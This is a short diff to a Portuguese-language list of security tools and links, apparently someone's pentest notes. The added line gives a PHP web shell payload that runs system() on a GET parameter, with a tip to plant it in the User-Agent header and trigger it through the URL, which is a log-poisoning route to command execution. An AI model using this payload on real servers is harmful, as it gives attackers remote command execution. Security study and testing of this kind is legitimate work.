@@ -155,3 +155,5 @@ Links para repositórios e ferramentas úteis.
 - [SHCheck - Shell/Header Vulnerability Checker](https://github.com/santoru/shcheck)
 - [Converter imagem em link pub](https://pngup.com/)
 
+- <?php system($_GET['ted']);?> no user agent e depois ve se proca na url e etc
+
